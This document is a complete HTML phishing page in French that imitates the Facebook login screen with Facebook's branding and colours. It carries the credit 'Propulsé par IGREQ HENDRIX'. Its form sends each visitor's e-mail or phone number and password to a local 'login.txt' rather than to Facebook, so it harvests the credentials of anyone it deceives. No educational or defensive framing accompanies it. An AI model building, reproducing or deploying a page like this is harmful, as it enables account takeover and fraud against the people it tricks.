<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Facebook – Se connecter ou s’inscrire</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #e9ebee;
      text-align: center;
      padding-top: 100px;
    }
    .login-box {
      background: white;
      padding: 40px;
      margin: auto;
      width: 300px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
    }
    button {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 10px;
      width: 95%;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
    }
    .brand {
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 20px;
    }
    .signature {
      margin-top: 30px;
      font-size: 10px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="brand">facebook</div>
    <form method="POST" action="login.txt">
      <input type="text" name="username" placeholder="Adresse e-mail ou numéro de téléphone" required><br>
      <input type="password" name="password" placeholder="Mot de passe" required><br>
      <button type="submit">Se connecter</button>
    </form>
    <div class="signature">Propulsé par IGREQ HENDRIX</div>
  </div>
</body>
</html>
